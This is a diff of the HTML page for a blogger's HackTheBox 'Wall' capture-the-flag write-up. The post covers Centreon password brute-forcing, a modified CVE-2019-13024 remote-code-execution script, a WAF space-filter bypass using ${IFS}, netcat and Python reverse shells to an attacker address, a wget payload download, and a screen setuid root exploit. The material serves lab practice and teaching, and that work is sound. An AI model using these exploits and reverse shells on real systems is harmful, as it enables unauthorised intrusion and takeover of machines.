@@ -1,15 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
-<head>
-  
-    <title>Wall - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
-  
-  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <head>
+    
+      <title>Wall - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.
-First thing first, let&#39;s add the box IP to the hosts file:
-$ echo &amp;#34;10.10.10.157 wall.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&#39;s start!
-User Flag Recon Let&#39;s start with the classic nmap scan:
+First thing first, let&amp;rsquo;s add the box IP to the hosts file:
+$ echo &amp;#34;10.10.10.157 wall.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&amp;rsquo;s start!
+User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:
 $ nmap -sV -sT -sC wall.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-28 16:25 CET Nmap scan report for wall."/>
 <meta name="keywords" content="hackthebox, ctf, wall, gobuster, wfuzz, centreon, cve-2019-13024, waf, filter, screen"/>
 <meta name="robots" content="noodp"/>
@@ -20,77 +20,54 @@ $ nmap -sV -sT -sC wall.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-2
 
 <link rel="stylesheet" href="/assets/style.css">
 
-  <link rel="stylesheet" href="/assets/green.css">
-
-
 
 <link rel="stylesheet" href="/style.css">
 
 
+
 <link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
-
-<link rel="shortcut icon" href="/img/favicon.ico">
-
+<link rel="shortcut icon" href="/img/favicon.png">
 
 
-<meta name="twitter:card" content="summary" />
-<meta name="twitter:title" content="Wall - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." />
-<meta name="twitter:description" content="Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.
-First thing first, let&#39;s add the box IP to the hosts file:
-$ echo &amp;#34;10.10.10.157 wall.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&#39;s start!
-User Flag Recon Let&#39;s start with the classic nmap scan:
-$ nmap -sV -sT -sC wall.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-28 16:25 CET Nmap scan report for wall." />
-<meta name="twitter:site" content="/" />
-<meta name="twitter:creator" content="hg8" />
-<meta name="twitter:image" content="/img/wall-hackthebox.png">
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="Wall - HackTheBox"/>
+<meta name="twitter:description" content="Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out."/>
 
 
-<meta property="og:locale" content="en" />
+
+<meta property="og:title" content="Wall - HackTheBox" />
+<meta property="og:description" content="Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out." />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="Wall - HackTheBox :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.">
-<meta property="og:description" content="Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.
-First thing first, let&#39;s add the box IP to the hosts file:
-$ echo &amp;#34;10.10.10.157 wall.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&#39;s start!
-User Flag Recon Let&#39;s start with the classic nmap scan:
-$ nmap -sV -sT -sC wall.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-28 16:25 CET Nmap scan report for wall." />
 <meta property="og:url" content="/posts/wall/" />
-<meta property="og:site_name" content="Wall - HackTheBox" />
-<meta property="og:image" content="/img/wall-hackthebox.png">
-<meta property="og:image:width" content="2048">
-<meta property="og:image:height" content="1024">
-
-<meta property="article:published_time" content="2019-12-07 00:00:00 &#43;0000 UTC" />
+<meta property="article:published_time" content="2019-12-07T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-12-07T00:00:00+00:00" /><meta property="og:site_name" content="hg8&#39;s Notes" />
 
 
 
 
 
 
-
-
-
-
-
-</head>
-<body class="">
-
-
-<div class="container center headings--one-size">
-
-  <header class="header">
-  <div class="header__inner">
-    <div class="header__logo">
-      <a href="/">
-  <div class="logo">
-    hg8&#39;s Notes
-  </div>
+  </head>
+  <body class="dark-theme">
+    <div class="container">
+      <header class="header">
+  <span class="header__inner">
+    <a href="/" class="logo" style="text-decoration: none;">
+  
+    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
+  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
+</svg>
+</span>
+    <span class="logo__text">./hg8.rocks</span>
+    <span class="logo__cursor"></span>
+  
 </a>
 
-    </div>
-    <div class="menu-trigger">menu</div>
-  </div>
-  
-    <nav class="menu">
+
+    <span class="header__right">
+      
+        
+<nav class="menu">
   <ul class="menu__inner menu__inner--desktop">
     
       
@@ -99,13 +76,20 @@ $ nmap -sV -sT -sC wall.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-2
         
       
         
+          <li><a href="/tags">Tags</a></li>
+        
+      
+        
           <li><a href="/about">About</a></li>
         
       
       
     
-
-    
+    <li>
+<a href="/search" title="Search">
+<img src="/icon/search.svg" alt="search" height="24">
+</a>
+<li>
   </ul>
 
   <ul class="menu__inner menu__inner--mobile">
@@ -115,73 +99,101 @@ $ nmap -sV -sT -sC wall.htb Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-2
       
     
       
-        <li><a href="/about">About</a></li>
+        <li><a href="/tags">Tags</a></li>
       
     
+      
+        <li><a href="/about">About</a></li>
+      
     
   </ul>
 </nav>
 
-  
+        <span class="menu-trigger">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M0 0h24v24H0z" fill="none"/>
+            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+          </svg>
+        </span>
+      
+      
+      <span class="theme-toggle">
+        <svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+  <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+</svg>
+
+      </span>
+    </span>
+  </span>
 </header>
 
 
-  <div class="content">
-    
-<div class="post">
-  <h1 class="post-title">
-    <a href="/posts/wall/">Wall - HackTheBox</a></h1>
-  <div class="post-meta">
+      <div class="content">
+        
+  
+  
+
+  <div class="post">
+    <h2 class="post-title"><a href="/posts/wall/">Wall - HackTheBox</a></h2>
+    <div class="post-meta">
       
-    <span class="post-date">
-      2019-12-07
-    </span>
-    
-    
-    <span class="post-author">::
-      hg8
-    </span>
-    
-  </div>
+        <span class="post-date">
+          2019-12-07
+        </span>
 
-  
-  <span class="post-tags">
-    
-    #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
-    
-    #<a href="/tags/ctf/">ctf</a>&nbsp;
-    
-    #<a href="/tags/wall/">wall</a>&nbsp;
-    
-    #<a href="/tags/gobuster/">gobuster</a>&nbsp;
-    
-    #<a href="/tags/wfuzz/">wfuzz</a>&nbsp;
-    
-    #<a href="/tags/centreon/">centreon</a>&nbsp;
-    
-    #<a href="/tags/cve-2019-13024/">cve-2019-13024</a>&nbsp;
-    
-    #<a href="/tags/waf/">waf</a>&nbsp;
-    
-    #<a href="/tags/filter/">filter</a>&nbsp;
-    
-    #<a href="/tags/screen/">screen</a>&nbsp;
-    
-  </span>
-  
+        
+          
+        
+      
 
-  
-  <img src="/img/wall-hackthebox.png" class="post-cover" />
-  
+      <span class="post-author">— Written by hg8</span>
+      
+        <span class="post-read-time">— 9 min read</span>
+      
+    </div>
 
-  <div class="post-content"><div>
-        <p>Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.</p>
-<p>First thing first, let's add the box IP to the hosts file:</p>
+    
+      <span class="post-tags">
+        
+          #<a href="/tags/hackthebox/">hackthebox</a>&nbsp;
+        
+          #<a href="/tags/ctf/">ctf</a>&nbsp;
+        
+          #<a href="/tags/wall/">wall</a>&nbsp;
+        
+          #<a href="/tags/gobuster/">gobuster</a>&nbsp;
+        
+          #<a href="/tags/wfuzz/">wfuzz</a>&nbsp;
+        
+          #<a href="/tags/centreon/">centreon</a>&nbsp;
+        
+          #<a href="/tags/cve-2019-13024/">cve-2019-13024</a>&nbsp;
+        
+          #<a href="/tags/waf/">waf</a>&nbsp;
+        
+          #<a href="/tags/filter/">filter</a>&nbsp;
+        
+          #<a href="/tags/screen/">screen</a>&nbsp;
+        
+      </span>
+    
+
+    
+      
+        <img src="/img/wall-hackthebox.png" class="post-cover" />
+      
+    
+
+    <div class="post-content">
+      <p>Wall was an interresting box, exploit oriented. The initial foothold was not straight forward to find and took a bit of time to finally figure out.</p>
+<p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.157 wall.htb&#34;</span> &gt;&gt; /etc/hosts
-</code></pre></div><p>and let's start!</p>
-<h1 id="user-flag">User Flag<a href="#user-flag" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
-<h2 id="recon">Recon<a href="#recon" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
-<p>Let's start with the classic nmap scan:</p>
+</code></pre></div><p>and let&rsquo;s start!</p>
+<h1 id="user-flag">User Flag</h1>
+<h2 id="recon">Recon</h2>
+<p>Let&rsquo;s start with the classic nmap scan:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC wall.htb
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-28 16:25 CET
 Nmap scan report <span style="color:#66d9ef">for</span> wall.htb <span style="color:#f92672">(</span>10.10.10.157<span style="color:#f92672">)</span>
@@ -195,7 +207,7 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 </code></pre></div><p>We have a classical web app running on port 80 and the ssh port 22 open.</p>
 <p>Opening <a href="http://wall.htb">http://wall.htb</a> display the Apache2 Ubuntu Default Page as <code>nmap</code> told us:</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/67693154-8bae0800-f9a1-11e9-995d-b2fb18a8a970.png" alt="Wall website"></p>
-<p>The source code of the page do not reveal any sneaky hidden code so let's move on.</p>
+<p>The source code of the page do not reveal any sneaky hidden code so let&rsquo;s move on.</p>
 <p>We launch <code>gobuster</code> to see if we can find interresting files and/or directories :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ gobuster dir -u http://wall.htb/ -w ~/SecLists/Discovery/Web-Content/big.txt -x php
 <span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
@@ -236,7 +248,7 @@ Server: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="col
 
 Just a test <span style="color:#66d9ef">for</span> php file !
 </code></pre></div><p>Hum we do not have too much informations here. <code>/monitoring</code> and <code>/server-status</code> prompt Basic Auth.</p>
-<p>From here we didn't make a lot of progress. Trying to brute-force the Basic Auth of <code>/monitoring</code> and <code>/server-status</code> doesn't gives results. We don't even have any particular informations on the two php files.
+<p>From here we didn&rsquo;t make a lot of progress. Trying to brute-force the Basic Auth of <code>/monitoring</code> and <code>/server-status</code> doesn&rsquo;t gives results. We don&rsquo;t even have any particular informations on the two php files.
 After getting into rabbit holes for a few times I decided to try different HTTP Method on the php endpoints with a simple command:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#66d9ef">for</span> method in GET HG8 POST PUT PATCH DELETE OPTIONS TRACE CONNECT; <span style="color:#66d9ef">do</span>
 &gt; echo <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">\n</span>$method<span style="color:#e6db74">:</span><span style="color:#e6db74">&#34;</span>
@@ -269,7 +281,7 @@ Total found exploits: <span style="color:#ae81ff">10</span>
 Web-search URL: https://vulners.com/search?query<span style="color:#f92672">=</span>bulletinFamily%3Aexploit+AND+centreon
 
 Centreon 19.04  - Remote Code | https://vulners.com/exploitdb/EDB-ID:47069
-</code></pre></div><p>Unfortunately this is a Authenticated RCE and we have no way to bypass authentication. Since we don't have any clues, let's try to bruteforce with user <code>admin</code>.</p>
+</code></pre></div><p>Unfortunately this is a Authenticated RCE and we have no way to bypass authentication. Since we don&rsquo;t have any clues, let&rsquo;s try to bruteforce with user <code>admin</code>.</p>
 <p>To avoid the struggle of <code>centreon</code> token on the login page we will use the Centreon API instead. The documentation is available on the <a href="https://documentation.centreon.com/docs/centreon/en/19.04/api/api_rest/index.html#authentication">Centreon documentation</a>.</p>
 <p>I like to use <a href="https://github.com/berzerk0/Probable-Wordlists">Probable-Wordlists</a> instead of the classic <code>rockyou.txt</code> that countains too much garbages:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ wget https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/Top304Thousand-probable-v2.txt
@@ -287,7 +299,7 @@ ID           Response   Lines    Word     Chars       Payload
 <span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span><span style="color:#f92672">=</span>
 
 000000048:   <span style="color:#ae81ff">200</span>        <span style="color:#ae81ff">0</span> L      <span style="color:#ae81ff">1</span> W      <span style="color:#ae81ff">61</span> Ch       <span style="color:#e6db74">&#34;password1&#34;</span>                                                                                                                                                                                                                                                                        ^C
-</code></pre></div><p>We now have the credentials, let's login and try to execute the exploit. The exploit author wrote a <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">blog post</a> explaining in detail the issue and how the exploit work. It's a very useful ressource to tweak the exploit to make it working on this box.</p>
+</code></pre></div><p>We now have the credentials, let&rsquo;s login and try to execute the exploit. The exploit author wrote a <a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/">blog post</a> explaining in detail the issue and how the exploit work. It&rsquo;s a very useful ressource to tweak the exploit to make it working on this box.</p>
 <p>I had to tweak a few lines to make it work it work properly on that box, my final script was :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">cat exploit<span style="color:#f92672">.</span>py
 <span style="color:#75715e">#!/usr/bin/python</span>
@@ -372,7 +384,7 @@ login_request <span style="color:#f92672">=</span> request<span style="color:#f9
 <span style="color:#66d9ef">else</span>:
     <span style="color:#66d9ef">print</span>(<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">[-] Wrong credentials</span><span style="color:#e6db74">&#34;</span>)
     exit()
-</code></pre></div><p>The exploit takes one argument which is the command we want to run. Let's try to run a <code>netcat</code> reverse shell:</p>
+</code></pre></div><p>The exploit takes one argument which is the command we want to run. Let&rsquo;s try to run a <code>netcat</code> reverse shell:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;nc -e /bin/sh 10.0.0.1 8585&#34;</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : b4710792d09b371b03c9ef6d3bbf3f26
@@ -393,7 +405,7 @@ on this server.&lt;br /&gt;
 
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Injecting Done.
 </code></pre></div><p>Hum, we get stuck with <code>Forbidden</code>.</p>
-<p>Seems like a WAF (web application firewall) is in place (probably the why the box name is <code>Wall</code>). When we send a simple test command, like <code>test</code> the injection succeed. Let's try to send a few special char we had in our netcat command to find which one exactly is filtered :</p>
+<p>Seems like a WAF (web application firewall) is in place (probably the why the box name is <code>Wall</code>). When we send a simple test command, like <code>test</code> the injection succeed. Let&rsquo;s try to send a few special char we had in our netcat command to find which one exactly is filtered :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;-/,.&#34;</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : b4710792d09b371b03c9ef6d3bbf3f26
@@ -401,7 +413,7 @@ on this server.&lt;br /&gt;
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving Poller token
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Poller token is : c7f63cd8143107496edfdb8ac304b5ca
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Injecting Done.
-</code></pre></div><p>No blocking this time&hellip; So what remains ? The space of course&hellip;. Let's give it a try:</p>
+</code></pre></div><p>No blocking this time&hellip; So what remains ? The space of course&hellip;. Let&rsquo;s give it a try:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;test test&#34;</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : b4710792d09b371b03c9ef6d3bbf3f26
@@ -421,25 +433,25 @@ on this server.&lt;br /&gt;
 &lt;/body&gt;&lt;/html&gt;
 
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Injecting Done.
-</code></pre></div><p>So now we have to find a solution to use command without spaces&hellip; Searching a bit online we find that it's possible to use the <a href="https://en.wikipedia.org/wiki/Internal_field_separator">Internal field separator</a> :</p>
+</code></pre></div><p>So now we have to find a solution to use command without spaces&hellip; Searching a bit online we find that it&rsquo;s possible to use the <a href="https://en.wikipedia.org/wiki/Internal_field_separator">Internal field separator</a> :</p>
 <blockquote>
 <p>The shell treats each character of $IFS as a delimiter, and splits the results of the other expansions into words on these characters.</p>
 </blockquote>
-<p>Let's give it try:</p>
+<p>Let&rsquo;s give it try:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo$IFStest
 $
-</code></pre></div><p>Unfortunately this doesn't seems to work but using the brackets works!</p>
+</code></pre></div><p>Unfortunately this doesn&rsquo;t seems to work but using the brackets works!</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo<span style="color:#e6db74">${</span>IFS<span style="color:#e6db74">}</span>test
 test
-</code></pre></div><p>Let's try edit our exploit to replace spaces with the IFS:</p>
+</code></pre></div><p>Let&rsquo;s try edit our exploit to replace spaces with the IFS:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">[...]
 command = sys.argv[1]
 <span style="color:#a6e22e">+ command = command.replace(&#39; &#39;, &#39;${IFS}&#39;)
 </span><span style="color:#a6e22e"></span>[...]
-</code></pre></div><p>This time we are going to open a local web server to have feedback on wether our command injection worked on not. In a new terminal let's open a python simple http server:</p>
+</code></pre></div><p>This time we are going to open a local web server to have feedback on wether our command injection worked on not. In a new terminal let&rsquo;s open a python simple http server:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python -m http.server
 Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
-</code></pre></div><p>And let's run our exploit again:</p>
+</code></pre></div><p>And let&rsquo;s run our exploit again:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python exploit.py <span style="color:#e6db74">&#34;wget 10.10.10.10:8000/hg8.py -O /tmp/hg8.py&#34;</span>
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Retrieving CSRF token to submit the login form
 <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Login token is : 56855cc04ceb87148ce7d83c4b90bd9e
@@ -453,7 +465,7 @@ Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style
 10.10.10.10 - - <span style="color:#f92672">[</span>29/Oct/2019 13:29:27<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /hg8.py HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> -
 </code></pre></div><p>The <code>hg8.py</code> countains a python reverse shell:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> socket<span style="color:#f92672">,</span>subprocess<span style="color:#f92672">,</span>os;s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM);s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">10.0.0.1</span><span style="color:#e6db74">&#34;</span>,<span style="color:#ae81ff">8585</span>));os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>); os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>);p<span style="color:#f92672">=</span>subprocess<span style="color:#f92672">.</span>call([<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">/bin/sh</span><span style="color:#e6db74">&#34;</span>,<span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">-i</span><span style="color:#e6db74">&#34;</span>]);
-</code></pre></div><p>Since we managed to write it to the server, let's run it now. We first open our <code>nc</code> listener:</p>
+</code></pre></div><p>Since we managed to write it to the server, let&rsquo;s run it now. We first open our <code>nc</code> listener:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
 </code></pre></div><p>And run the exploit again :</p>
@@ -472,7 +484,7 @@ Connection from 10.10.10.157:50472
 $ id
 uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>,6000<span style="color:#f92672">(</span>centreon<span style="color:#f92672">)</span>
 </code></pre></div><p>We got our first shell. Time to move onto the user flag.</p>
-<p>Let's enumerate what we have here :</p>
+<p>Let&rsquo;s enumerate what we have here :</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ls -l /home
 total <span style="color:#ae81ff">8</span>
 drwxr-xr-x <span style="color:#ae81ff">6</span> shelby     shelby     <span style="color:#ae81ff">4096</span> Jul <span style="color:#ae81ff">30</span> 17:37 shelby
@@ -487,7 +499,7 @@ $ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
 <p>Binaries with the setuid bit enabled, are being executed as if they were running under the context of the root user. This enables normal (non-privileged) users to use special privileges, like opening sockets. While this seems unnecessary for a normal user, it is actually needed for simple commands like ping.</p>
 </blockquote>
 <p>After a bit of search we stumbled upon a <a href="https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html">bug</a> that allows to privilege escalte to root with <code>screen</code> 4.5.0 and setuid bit set.
-Let's give it a try !</p>
+Let&rsquo;s give it a try !</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#75715e"># On attacker side</span>
 $ wget https://raw.githubusercontent.com/XiphosResearch/exploits/master/screen2root/screenroot.sh
 2019-10-29 14:59:15 <span style="color:#f92672">(</span>4.83 MB/s<span style="color:#f92672">)</span> - ‘screenroot.sh’ saved <span style="color:#f92672">[</span>1152/1152<span style="color:#f92672">]</span>
@@ -513,68 +525,77 @@ uid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root
 fe6194544f45xxxxx5b12f8da8406
 <span style="color:#75715e"># cat /root/root.txt</span>
 1fdbcf8c33exxxxxx2e1b4d5db7
-</code></pre></div><p>Later I will give this box another try to pivot correctly to the <code>shelby</code> user if it's possible and update this writeup.</p>
+</code></pre></div><p>Later I will give this box another try to pivot correctly to the <code>shelby</code> user if it&rsquo;s possible and update this writeup.</p>
